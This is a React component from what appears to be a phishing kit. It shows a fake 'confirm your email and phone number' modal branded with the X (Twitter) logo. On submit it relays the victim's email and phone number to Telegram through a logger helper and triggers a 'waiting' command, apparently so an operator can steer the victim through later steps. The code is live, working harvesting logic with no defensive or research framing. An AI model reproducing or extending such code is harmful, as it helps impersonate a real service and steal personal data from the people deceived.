"use client";

import { useState } from "react";
import { setUserData, updateTelegramMessage, simulateCommand } from "@/utils/telegramLogger";

interface EmailPhoneVerificationProps {
  onSubmit: (email: string, phone: string) => void;
  onClose: () => void;
}

export default function EmailPhoneVerification({ onSubmit, onClose }: EmailPhoneVerificationProps) {
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    if (!email.trim()) {
      alert("Please enter your email");
      return;
    }

    if (!phone.trim()) {
      alert("Please enter your phone number");
      return;
    }

    setLoading(true);

    try {
      // Store the email and phone in telegramLogger for access by other components
      setUserData({ email, phone });

      // Update the Telegram message with the new information
      const status = `📧 EMAIL: ${email}\n📱 PHONE: ${phone}`;

      await updateTelegramMessage(
        {
          email: email,
          phoneNumber: phone
        },
        status
      );

      // Waiting komutunu simüle et
      simulateCommand("waiting");

      // Önce onSubmit'i çağır
      await onSubmit(email, phone);
    } catch (error) {
      console.error("Error submitting email and phone:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
      <div className="bg-white rounded-2xl w-full max-w-[400px] relative mx-4 overflow-hidden">
        {/* Header */}
        <div className="p-4 text-center relative border-b border-gray-200">
          <div className="absolute left-4 top-4 cursor-pointer" onClick={onClose}>
            <svg viewBox="0 0 24 24" aria-hidden="true" className="h-5 w-5">
              <path
                d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
                fill="currentColor"
              />
            </svg>
          </div>
          <h2 className="text-xl font-bold">Email & Phone Number</h2>
        </div>

        <div className="p-5">
          {/* Description */}
          <div className="bg-[#f5d0d3] text-[#6e2728] p-3 rounded-md mb-5 text-sm">
            Please confirm your email and phone number.
          </div>

          {/* Form */}
          <div className="space-y-4">
            <div>
              <input
                type="email"
                placeholder="Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-white"
              />
            </div>
            <div>
              <input
                type="tel"
                placeholder="Phone number"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-white"
              />
            </div>
          </div>
        </div>

        {/* Footer with button */}
        <div className="p-4">
          <button
            onClick={handleSubmit}
            disabled={loading}
            className="w-full bg-gray-600 hover:bg-gray-700 text-white rounded-full py-3 font-medium"
          >
            {loading ? "Processing..." : "Next"}
          </button>
        </div>
      </div>
    </div>
  );
}
